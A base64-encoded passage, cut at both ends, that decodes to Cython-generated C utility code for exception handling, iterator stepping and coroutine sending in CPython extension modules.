xuI2Vsc2VcbiAgICAgICAgUHlPYmplY3QgKnRtcF90eXBlLCAqdG1wX3ZhbHVlLCAqdG1wX3RiO1xuICAgICAgICBQeUVycl9GZXRjaCgmdG1wX3R5cGUsICZ0bXBfdmFsdWUsICZ0bXBfdGIpO1xuICAgICAgICBQeV9JTkNSRUYodGIpO1xuICAgICAgICBQeUVycl9SZXN0b3JlKHRtcF90eXBlLCB0bXBfdmFsdWUsIHRiKTtcbiAgICAgICAgUHlfWERFQ1JFRih0bXBfdGIpO1xuI2VuZGlmXG4gICAgfVxuYmFkOlxuICAgIFB5X1hERUNSRUYob3duZWRfaW5zdGFuY2UpO1xuICAgIHJldHVybjtcbn1cblxuXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBBMDAwMFxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9HZXRCdWlsdGluTmV4dF9MaW1pdGVkQVBJKHZvaWQpIHtcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fUHl4X0dldEJ1aWx0aW5OZXh0X0xpbWl0ZWRBUElfY2FjaGUpKVxuICAgICAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX1B5eF9HZXRCdWlsdGluTmV4dF9MaW1pdGVkQVBJX2NhY2hlID0gX19QeXhfR2V0QnVpbHRpbk5hbWUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X25leHQpO1xuICAgIHJldHVybiBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX1B5eF9HZXRCdWlsdGluTmV4dF9MaW1pdGVkQVBJX2NhY2hlO1xufVxuI2VuZGlmXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfUHlJdGVyX05leHRfUGxhaW4oUHlPYmplY3QgKml0ZXJhdG9yKSB7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBBMDAwMFxuICAgIFB5T2JqZWN0ICpyZXN1bHQ7XG4gICAgUHlPYmplY3QgKm5leHQgPSBfX1B5eF9HZXRCdWlsdGluTmV4dF9MaW1pdGVkQVBJKCk7XG4gICAgaWYgKHVubGlrZWx5KCFuZXh0KSkgcmV0dXJuIE5VTEw7XG4gICAgcmVzdWx0ID0gUHlPYmplY3RfQ2FsbEZ1bmN0aW9uT2JqQXJncyhuZXh0LCBpdGVyYXRvciwgTlVMTCk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbiNlbHNlXG4gICAgKHZvaWQpX19QeXhfR2V0QnVpbHRpbk5hbWU7IC8vIG9ubHkgZm9yIGVhcmx5IGxpbWl0ZWQgQVBJXG4gICAgaXRlcm5leHRmdW5jIGl0ZXJuZXh0ID0gX19QeXhfUHlPYmplY3RfR2V0SXRlck5leHRGdW5jKGl0ZXJhdG9yKTtcbiAgICBhc3NlcnQoaXRlcm5leHQpO1xuICAgIHJldHVybiBpdGVybmV4dChpdGVyYXRvcik7XG4jZW5kaWZcbn1cblxuXG5zdGF0aWMgdm9pZCBfX1B5eF9fUmV0dXJuV2l0aFN0b3BJdGVyYXRpb24oUHlPYmplY3QqIHZhbHVlLCBpbnQgYXN5bmMpO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9SZXR1cm5XaXRoU3RvcEl0ZXJhdGlvbihQeU9iamVjdCogdmFsdWUsIGludCBhc3luYywgaW50IGl0ZXJuZXh0KSB7XG4gICAgaWYgKHZhbHVlID09IFB5X05vbmUpIHtcbiAgICAgICAgaWYgKGFzeW5jIHx8ICFpdGVybmV4dClcbiAgICAgICAgICAgIFB5RXJyX1NldE5vbmUoYXN5bmMgPyBQeUV4Y19TdG9wQXN5bmNJdGVyYXRpb24gOiBQeUV4Y19TdG9wSXRlcmF0aW9uKTtcbiAgICAgICAgcmV0dXJuO1xuICAgIH1cbiAgICBfX1B5eF9fUmV0dXJuV2l0aFN0b3BJdGVyYXRpb24odmFsdWUsIGFzeW5jKTtcbn1cbnN0YXRpYyB2b2lkIF9fUHl4X19SZXR1cm5XaXRoU3RvcEl0ZXJhdGlvbihQeU9iamVjdCogdmFsdWUsIGludCBhc3luYykge1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZVxuI2VuZGlmXG4gICAgUHlPYmplY3QgKmV4YztcbiAgICBQeU9iamVjdCAqZXhjX3R5cGUgPSBhc3luYyA/IFB5RXhjX1N0b3BBc3luY0l0ZXJhdGlvbiA6IFB5RXhjX1N0b3BJdGVyYXRpb247XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG4gICAgaWYgKChQWV9WRVJTSU9OX0hFWCA+PSAoMHgwMzBDMDBBNikpIHx8IHVubGlrZWx5KFB5VHVwbGVfQ2hlY2sodmFsdWUpIHx8IFB5RXhjZXB0aW9uSW5zdGFuY2VfQ2hlY2sodmFsdWUpKSkge1xuICAgICAgICBpZiAoUFlfVkVSU0lPTl9IRVggPj0gKDB4MDMwZTAwQTEpKSB7XG4gICAgICAgICAgICBleGMgPSBfX1B5eF9QeU9iamVjdF9DYWxsT25lQXJnKGV4Y190eXBlLCB2YWx1ZSk7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBQeU9iamVjdCAqYXJnc190dXBsZSA9IFB5VHVwbGVfTmV3KDEpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFhcmdzX3R1cGxlKSkgcmV0dXJuO1xuICAgICAgICAgICAgUHlfSU5DUkVGKHZhbHVlKTtcbiAgICAgICAgICAgIFB5VHVwbGVfU0VUX0lURU0oYXJnc190dXBsZSwgMCwgdmFsdWUpO1xuICAgICAgICAgICAgZXhjID0gUHlPYmplY3RfQ2FsbChleGNfdHlwZSwgYXJnc190dXBsZSwgTlVMTCk7XG4gICAgICAgICAgICBQeV9ERUNSRUYoYXJnc190dXBsZSk7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKHVubGlrZWx5KCFleGMpKSByZXR1cm47XG4gICAgfSBlbHNlIHtcbiAgICAgICAgUHlfSU5DUkVGKHZhbHVlKTtcbiAgICAgICAgZXhjID0gdmFsdWU7XG4gICAgfVxuICAgICNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEVcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgICNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLXG4gICAgaWYgKCFfX3B5eF90c3RhdGUtPmV4Y19pbmZvLT5leGNfdmFsdWUpXG4gICAgI2Vsc2VcbiAgICBpZiAoIV9fcHl4X3RzdGF0ZS0+ZXhjX3R5cGUpXG4gICAgI2VuZGlmXG4gICAge1xuICAgICAgICBQeV9JTkNSRUYoZXhjX3R5cGUpO1xuICAgICAgICBfX1B5eF9FcnJSZXN0b3JlKGV4Y190eXBlLCBleGMsIE5VTEwpO1xuICAgICAgICByZXR1cm47XG4gICAgfVxuICAgICNlbmRpZlxuI2Vsc2VcbiAgICBleGMgPSBfX1B5eF9QeU9iamVjdF9DYWxsT25lQXJnKGV4Y190eXBlLCB2YWx1ZSk7XG4gICAgaWYgKHVubGlrZWx5KCFleGMpKSByZXR1cm47XG4jZW5kaWZcbiAgICBQeUVycl9TZXRPYmplY3QoZXhjX3R5cGUsIGV4Yyk7XG4gICAgUHlfREVDUkVGKGV4Yyk7XG59XG5cblxuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4jaW5jbHVkZSA8ZnJhbWVvYmplY3QuaD5cbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGIwMGE2ICYmICFkZWZpbmVkKFBZUFlfVkVSU0lPTilcbiAgI2lmbmRlZiBQeV9CVUlMRF9DT1JFXG4gICAgI2RlZmluZSBQeV9CVUlMRF9DT1JFIDFcbiAgI2VuZGlmXG4gICNpbmNsdWRlICJpbnRlcm5hbC9weWNvcmVfZnJhbWUuaCJcbiNlbmRpZlxuI2VuZGlmIC8vIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWRcbl9fUHl4X0Nvcm91dGluZV9VbmRlbGVnYXRlKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuKSB7XG4jaWYgQ1lUSE9OX1VTRV9BTV9TRU5EXG4gICAgZ2VuLT55aWVsZGZyb21fYW1fc2VuZCA9IE5VTEw7XG4jZW5kaWZcbiAgICBQeV9DTEVBUihnZW4tPnlpZWxkZnJvbSk7XG59XG5zdGF0aWMgaW50IF9fUHl4X1B5R2VuX19GZXRjaFN0b3BJdGVyYXRpb25WYWx1ZShQeVRocmVhZFN0YXRlICpfX3B5eF90c3RhdGUsIFB5T2JqZWN0ICoqcHZhbHVlKSB7XG4gICAgUHlPYmplY3QgKmV0LCAqZXYsICp0YjtcbiAgICBQeU9iamVjdCAqdmFsdWUgPSBOVUxMO1xuICAgIENZVEhPTl9VTlVTRURfVkFSKF9fcHl4X3RzdGF0ZSk7XG4gICAgX19QeXhfRXJyRmV0Y2goJmV0LCAmZXYsICZ0Yik7XG4gICAgaWYgKCFldCkge1xuICAgICAgICBQeV9YREVDUkVGKHRiKTtcbiAgICAgICAgUHlfWERFQ1JFRihldik7XG4gICAgICAgIFB5X0lOQ1JFRihQeV9Ob25lKTtcbiAgICAgICAgKnB2YWx1ZSA9IFB5X05vbmU7XG4gICAgICAgIHJldHVybiAwO1xuICAgIH1cbiAgICBpZiAobGlrZWx5KGV0ID09IFB5RXhjX1N0b3BJdGVyYXRpb24pKSB7XG4gICAgICAgIGlmICghZXYpIHtcbiAgICAgICAgICAgIFB5X0lOQ1JFRihQeV9Ob25lKTtcbiAgICAgICAgICAgIHZhbHVlID0gUHlfTm9uZTtcbiAgICAgICAgfVxuICAgICAgICBlbHNlIGlmIChsaWtlbHkoX19QeXhfSVNfVFlQRShldiwgKFB5VHlwZU9iamVjdCopUHlFeGNfU3RvcEl0ZXJhdGlvbikpKSB7XG4gICAgICAgICAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMXG4gICAgICAgICAgICB2YWx1ZSA9IFB5T2JqZWN0X0dldEF0dHIoZXYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV92YWx1ZSk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIXZhbHVlKSkgZ290byBsaW1pdGVkX2FwaV9mYWlsdXJlO1xuICAgICAgICAgICAgI2Vsc2VcbiAgICAgICAgICAgIHZhbHVlID0gKChQeVN0b3BJdGVyYXRpb25PYmplY3QgKilldiktPnZhbHVlO1xuICAgICAgICAgICAgUHlfSU5DUkVGKHZhbHVlKTtcbiAgICAgICAgICAgICNlbmRpZlxuICAgICAgICAgICAgUHlfREVDUkVGKGV2KTtcbiAgICAgICAgfVxuICAgICAgICBlbHNlIGlmICh1bmxpa2VseShQeVR1cGxlX0NoZWNrKGV2KSkpIHtcbiAgICAgICAgICAgIFB5X3NzaXplX3QgdHVwbGVfc2l6ZSA9IF9fUHl4X1B5VHVwbGVfR0VUX1NJWkUoZXYpO1xuICAgICAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgICAgICAgICAgaWYgKHVubGlrZWx5KHR1cGxlX3NpemUgPCAwKSkge1xuICAgICAgICAgICAgICAgIFB5X1hERUNSRUYodGIpO1xuICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihldik7XG4gICAgICAgICAgICAgICAgUHlfREVDUkVGKGV0KTtcbiAgICAgICAgICAgICAgICByZXR1cm4gLTE7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICAjZW5kaWZcbiAgICAgICAgICAgIGlmICh0dXBsZV9zaXplID49IDEpIHtcbiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgICAgICAgICAgICAgIHZhbHVlID0gUHlUdXBsZV9HRVRfSVRFTShldiwgMCk7XG4gICAgICAgICAgICAgICAgUHlfSU5DUkVGKHZhbHVlKTtcbiNlbGlmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbiAgICAgICAgICAgICAgICB2YWx1ZSA9IFB5U2VxdWVuY2VfSVRFTShldiwgMCk7XG4jZWxzZVxuICAgICAgICAgICAgICAgIHZhbHVlID0gUHlTZXF1ZW5jZV9HZXRJdGVtKGV2LCAwKTtcbiAgICAgICAgICAgICAgICBpZiAoIXZhbHVlKSBnb3RvIGxpbWl0ZWRfYXBpX2ZhaWx1cmU7XG4jZW5kaWZcbiAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgUHlfSU5DUkVGKFB5X05vbmUpO1xuICAgICAgICAgICAgICAgIHZhbHVlID0gUHlfTm9uZTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIFB5X0RFQ1JFRihldik7XG4gICAgICAgIH1cbiAgICAgICAgZWxzZSBpZiAoIV9fUHl4X1R5cGVDaGVjayhldiwgKFB5VHlwZU9iamVjdCopUHlFeGNfU3RvcEl0ZXJhdGlvbikpIHtcbiAgICAgICAgICAgIHZhbHVlID0gZXY7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKGxpa2VseSh2YWx1ZSkpIHtcbiAgICAgICAgICAgIFB5X1hERUNSRUYodGIpO1xuICAgICAgICAgICAgUHlfREVDUkVGKGV0KTtcbiAgICAgICAgICAgICpwdmFsdWUgPSB2YWx1ZTtcbiAgICAgICAgICAgIHJldHVybiAwO1xuICAgICAgICB9XG4gICAgfSBlbHNlIGlmICghX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGV0LCBQeUV4Y19TdG9wSXRlcmF0aW9uKSkge1xuICAgICAgICBfX1B5eF9FcnJSZXN0b3JlKGV0LCBldiwgdGIpO1xuICAgICAgICByZXR1cm4gLTE7XG4gICAgfVxuICAgIFB5RXJyX05vcm1hbGl6ZUV4Y2VwdGlvbigmZXQsICZldiwgJnRiKTtcbiAgICBpZiAodW5saWtlbHkoIVB5T2JqZWN0X1R5cGVDaGVjayhldiwgKFB5VHlwZU9iamVjdCopUHlFeGNfU3RvcEl0ZXJhdGlvbikpKSB7XG4gICAgICAgIF9fUHl4X0VyclJlc3RvcmUoZXQsIGV2LCB0Yik7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgUHlfWERFQ1JFRih0Yik7XG4gICAgUHlfREVDUkVGKGV0KTtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgdmFsdWUgPSBQeU9iamVjdF9HZXRBdHRyKGV2LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdmFsdWUpO1xuI2Vsc2VcbiAgICB2YWx1ZSA9ICgoUHlTdG9wSXRlcmF0aW9uT2JqZWN0ICopZXYpLT52YWx1ZTtcbiAgICBQeV9JTkNSRUYodmFsdWUpO1xuI2VuZGlmXG4gICAgUHlfREVDUkVGKGV2KTtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgaWYgKHVubGlrZWx5KCF2YWx1ZSkpIHJldHVybiAtMTtcbiNlbmRpZlxuICAgICpwdmFsdWUgPSB2YWx1ZTtcbiAgICByZXR1cm4gMDtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUwgfHwgIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbiAgbGltaXRlZF9hcGlfZmFpbHVyZTpcbiAgICBQeV9YREVDUkVGKGV0KTtcbiAgICBQeV9YREVDUkVGKHRiKTtcbiAgICBQeV9YREVDUkVGKGV2KTtcbiAgICByZXR1cm4gLTE7XG4jZW5kaWZcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FXG5fX1B5eF9QeVNlbmRSZXN1bHQgX19QeXhfQ29yb3V0aW5lX3N0YXR1c19mcm9tX3Jlc3VsdChQeU9iamVjdCAqKnJldHZhbCkge1xuICAgIGlmICgqcmV0dmFsKSB7XG4gICAgICAgIHJldHVybiBQWUdFTl9ORVhUO1xuICAgIH0gZWxzZSBpZiAobGlrZWx5KF9fUHl4X1B5R2VuX19GZXRjaFN0b3BJdGVyYXRpb25WYWx1ZShfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQsIHJldHZhbCkgPT0gMCkpIHtcbiAgICAgICAgcmV0dXJuIFBZR0VOX1JFVFVSTjtcbiAgICB9IGVsc2Uge1xuICAgICAgICByZXR1cm4gUFlHRU5fRVJST1I7XG4gICAgfVxufVxuc3RhdGljIENZVEhPTl9JTkxJTkVcbnZvaWQgX19QeXhfQ29yb3V0aW5lX0V4Y2VwdGlvbkNsZWFyKF9fUHl4X0V4Y0luZm9TdHJ1Y3QgKmV4Y19zdGF0ZSkge1xuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQjAwYTRcbiAgICBQeV9DTEVBUihleGNfc3RhdGUtPmV4Y192YWx1ZSk7XG4jZWxzZVxuICAgIFB5T2JqZWN0ICp0LCAqdiwgKnRiO1xuICAgIHQgPSBleGNfc3RhdGUtPmV4Y190eXBlO1xuICAgIHYgPSBleGNfc3RhdGUtPmV4Y192YWx1ZTtcbiAgICB0YiA9IGV4Y19zdGF0ZS0+ZXhjX3RyYWNlYmFjaztcbiAgICBleGNfc3RhdGUtPmV4Y190eXBlID0gTlVMTDtcbiAgICBleGNfc3RhdGUtPmV4Y192YWx1ZSA9IE5VTEw7XG4gICAgZXhjX3N0YXRlLT5leGNfdHJhY2ViYWNrID0gTlVMTDtcbiAgICBQeV9YREVDUkVGKHQpO1xuICAgIFB5X1hERUNSRUYodik7XG4gICAgUHlfWERFQ1JFRih0Yik7XG4jZW5kaWZcbn1cbiNkZWZpbmUgX19QeXhfQ29yb3V0aW5lX0FscmVhZHlSdW5uaW5nRXJyb3IoZ2VuKSAgKF9fUHl4X19Db3JvdXRpbmVfQWxyZWFkeVJ1bm5pbmdFcnJvcihnZW4pLCAoUHlPYmplY3QqKU5VTEwpXG5zdGF0aWMgdm9pZCBfX1B5eF9fQ29yb3V0aW5lX0FscmVhZHlSdW5uaW5nRXJyb3IoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4pIHtcbiAgICBjb25zdCBjaGFyICptc2c7XG4gICAgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIoZ2VuKTtcbiAgICBpZiAoKDApKSB7XG4gICAgI2lmZGVmIF9fUHl4X0Nvcm91dGluZV9VU0VEXG4gICAgfSBlbHNlIGlmIChfX1B5eF9Db3JvdXRpbmVfQ2hlY2soKFB5T2JqZWN0KilnZW4pKSB7XG4gICAgICAgIG1zZyA9ICJjb3JvdXRpbmUgYWxyZWFkeSBleGVjdXRpbmciO1xuICAgICNlbmRpZlxuICAgICNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VEXG4gICAgfSBlbHNlIGlmIChfX1B5eF9Bc3luY0dlbl9DaGVja0V4YWN0KChQeU9iamVjdCopZ2VuKSkge1xuICAgICAgICBtc2cgPSAiYXN5bmMgZ2VuZXJhdG9yIGFscmVhZHkgZXhlY3V0aW5nIjtcbiAgICAjZW5kaWZcbiAgICB9IGVsc2Uge1xuICAgICAgICBtc2cgPSAiZ2VuZXJhdG9yIGFscmVhZHkgZXhlY3V0aW5nIjtcbiAgICB9XG4gICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1ZhbHVlRXJyb3IsIG1zZyk7XG59XG5zdGF0aWMgdm9pZCBfX1B5eF9Db3JvdXRpbmVfQWxyZWFkeVRlcm1pbmF0ZWRFcnJvcihQeU9iamVjdCAqZ2VuLCBQeU9iamVjdCAqdmFsdWUsIGludCBjbG9zaW5nKSB7XG4gICAgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIoZ2VuKTtcbiAgICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUihjbG9zaW5nKTtcbiAgICAjaWZkZWYgX19QeXhfQ29yb3V0aW5lX1VTRURcbiAgICBpZiAoIWNsb3NpbmcgJiYgX19QeXhfQ29yb3V0aW5lX0NoZWNrKGdlbikpIHtcbiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1J1bnRpbWVFcnJvciwgImNhbm5vdCByZXVzZSBhbHJlYWR5IGF3YWl0ZWQgY29yb3V0aW5lIik7XG4gICAgfSBlbHNlXG4gICAgI2VuZGlmXG4gICAgaWYgKHZhbHVlKSB7XG4gICAgICAgICNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VEXG4gICAgICAgIGlmIChfX1B5eF9Bc3luY0dlbl9DaGVja0V4YWN0KGdlbikpXG4gICAgICAgICAgICBQeUVycl9TZXROb25lKFB5RXhjX1N0b3BBc3luY0l0ZXJhdGlvbik7XG4gICAgICAgIGVsc2VcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIFB5RXJyX1NldE5vbmUoUHlFeGNfU3RvcEl0ZXJhdGlvbik7XG4gICAgfVxufVxuc3RhdGljXG5fX1B5eF9QeVNlbmRSZXN1bHQgX19QeXhfQ29yb3V0aW5lX1NlbmRFeChfX3B5eF9Db3JvdXRpbmVPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKipyZXN1bHQsIGludCBjbG9zaW5nKSB7XG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgUHlUaHJlYWRTdGF0ZSAqdHN0YXRlO1xuICAgIF9fUHl4X0V4Y0luZm9TdHJ1Y3QgKmV4Y19zdGF0ZTtcbiAgICBQeU9iamVjdCAqcmV0dmFsO1xuICAgIGFzc2VydChfX1B5eF9Db3JvdXRpbmVfZ2V0X2lzX3J1bm5pbmcoc2VsZikpOyAgLy8gQ2FsbGVycyBzaG91bGQgZW5zdXJlIGlzX3J1bm5pbmdcbiAgICBpZiAodW5saWtlbHkoc2VsZi0+cmVzdW1lX2xhYmVsID09IC0xKSkge1xuICAgICAgICBfX1B5eF9Db3JvdXRpbmVfQWxyZWFkeVRlcm1pbmF0ZWRFcnJvcigoUHlPYmplY3QqKXNlbGYsIHZhbHVlLCBjbG9zaW5nKTtcbiAgICAgICAgcmV0dXJuIFBZR0VOX0VSUk9SO1xuICAgIH1cbiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEVcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgIHRzdGF0ZSA9IF9fcHl4X3RzdGF0ZTtcbiNlbHNlXG4gICAgdHN0YXRlID0gX19QeXhfUHlUaHJlYWRTdGF0ZV9DdXJyZW50O1xuI2VuZGlmXG4gICAgZXhjX3N0YXRlID0gJnNlbGYtPmdpX2V4Y19zdGF0ZTtcbiAgICBpZiAoZXhjX3N0YXRlLT5leGNfdmFsdWUpIHtcbiAgICAgICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZXG4gICAgICAgICNlbHNlXG4gICAgICAgIFB5T2JqZWN0ICpleGNfdGI7XG4gICAgICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMGE0ICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbiAgICAgICAgZXhjX3RiID0gUHlFeGNlcHRpb25fR2V0VHJhY2ViYWNrKGV4Y19zdGF0ZS0+ZXhjX3ZhbHVlKTtcbiAgICAgICAgI2VsaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNFxuICAgICAgICBleGNfdGIgPSAoKFB5QmFzZUV4Y2VwdGlvbk9iamVjdCopIGV4Y19zdGF0ZS0+ZXhjX3ZhbHVlKS0+dHJhY2ViYWNrO1xuICAgICAgICAjZWxzZVxuICAgICAgICBleGNfdGIgPSBleGNfc3RhdGUtPmV4Y190cmFjZWJhY2s7XG4gICAgICAgICNlbmRpZlxuICAgICAgICBpZiAoZXhjX3RiKSB7XG4gICAgICAgICAgICBQeVRyYWNlYmFja09iamVjdCAqdGIgPSAoUHlUcmFjZWJhY2tPYmplY3QgKikgZXhjX3RiO1xuICAgICAgICAgICAgUHlGcmFtZU9iamVjdCAqZiA9IHRiLT50Yl9mcmFtZTtcbiAgICAgICAgICAgIGFzc2VydChmLT5mX2JhY2sgPT0gTlVMTCk7XG4gICAgICAgICAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBBMVxuICAgICAgICAgICAgZi0+Zl9iYWNrID0gUHlUaHJlYWRTdGF0ZV9HZXRGcmFtZSh0c3RhdGUpO1xuICAgICAgICAgICAgI2Vsc2VcbiAgICAgICAgICAgIFB5X1hJTkNSRUYodHN0YXRlLT5mcmFtZSk7XG4gICAgICAgICAgICBmLT5mX2JhY2sgPSB0c3RhdGUtPmZyYW1lO1xuICAgICAgICAgICAgI2VuZGlmXG4gICAgICAgICAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNCAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG4gICAgICAgICAgICBQeV9ERUNSRUYoZXhjX3RiKTtcbiAgICAgICAgICAgICNlbmRpZlxuICAgICAgICB9XG4gICAgICAgICNlbmRpZlxuICAgIH1cbiNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLXG4gICAgZXhjX3N0YXRlLT5wcmV2aW91c19pdGVtID0gdHN0YXRlLT5leGNfaW5mbztcbiAgICB0c3RhdGUtPmV4Y19pbmZvID0gZXhjX3N0YXRlO1xuI2Vsc2VcbiAgICBpZiAoZXhjX3N0YXRlLT5leGNfdHlwZSkge1xuICAgICAgICBfX1B5eF9FeGNlcHRpb25Td2FwKCZleGNfc3RhdGUtPmV4Y190eXBlLCAmZXhjX3N0YXRlLT5leGNfdmFsdWUsICZleGNfc3RhdGUtPmV4Y190cmFjZWJhY2spO1xuICAgIH0gZWxzZSB7XG4gICAgICAgIF9fUHl4X0Nvcm91dGluZV9FeGNlcHRpb25DbGVhcihleGNfc3RhdGUpO1xuICAgICAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZleGNfc3RhdGUtPmV4Y190eXBlLCAmZXhjX3N0YXRlLT5leGNfdmFsdWUsICZleGNfc3RhdGUtPmV4Y190cmFjZWJhY2spO1xuICAgIH1cbiNlbmRpZlxuICAgIHJldHZhbCA9IHNlbGYtPmJvZHkoc2VsZiwgdHN0YXRlLCB2YWx1ZSk7XG4jaWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDS1xuICAgIGV4Y19zdGF0ZSA9ICZzZWxmLT5naV9leGNfc3RhdGU7XG4gICAgdHN0YXRlLT5leGNfaW5mbyA9IGV4Y19zdGF0ZS0+cHJldmlvdXNfaXRlbTtcbiAgICBleGNfc3RhdGUtPnByZXZpb3VzX2l0ZW0gPSBOVUxMO1xuICAgIF9fUHl4X0Nvcm91dGluZV9SZXNldEZyYW1lQmFja3BvaW50ZXIoZXhjX3N0YXRlKTtcbiNlbmRpZlxuICAgICpyZXN1bHQgPSByZXR2YWw7XG4gICAgaWYgKHNlbGYtPnJlc3VtZV9sYWJlbCA9PSAtMSkge1xuICAgICAgICByZXR1cm4gbGlrZWx5KHJldHZhbCkgPyBQWUdFTl9SRVRVUk4gOiBQWUdFTl9FUlJPUjtcbiAgICB9XG4gICAgcmV0dXJuIFBZR0VOX05FWFQ7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0Nvcm91dGluZV9SZXNldEZyYW1lQmFja3BvaW50ZXIoX19QeXhfRXhjSW5mb1N0cnVjdCAqZXhjX3N0YXRlKSB7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihleGNfc3RhdGUpO1xuI2Vsc2VcbiAgICBQeU9iamVjdCAqZXhjX3RiO1xuICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMGE0XG4gICAgaWYgKCFleGNfc3RhdGUtPmV4Y192YWx1ZSkgcmV0dXJuO1xuICAgIGV4Y190YiA9IFB5RXhjZXB0aW9uX0dldFRyYWNlYmFjayhleGNfc3RhdGUtPmV4Y192YWx1ZSk7XG4gICAgI2Vsc2VcbiAgICBleGNfdGIgPSBleGNfc3RhdGUtPmV4Y190cmFjZWJhY2s7XG4gICAgI2VuZGlmXG4gICAgaWYgKGxpa2VseShleGNfdGIpKSB7XG4gICAgICAgIFB5VHJhY2ViYWNrT2JqZWN0ICp0YiA9IChQeVRyYWNlYmFja09iamVjdCAqKSBleGNfdGI7XG4gICAgICAgIFB5RnJhbWVPYmplY3QgKmYgPSB0Yi0+dGJfZnJhbWU7XG4gICAgICAgIFB5X0NMRUFSKGYtPmZfYmFjayk7XG4gICAgICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMGE0XG4gICAgICAgIFB5X0RFQ1JF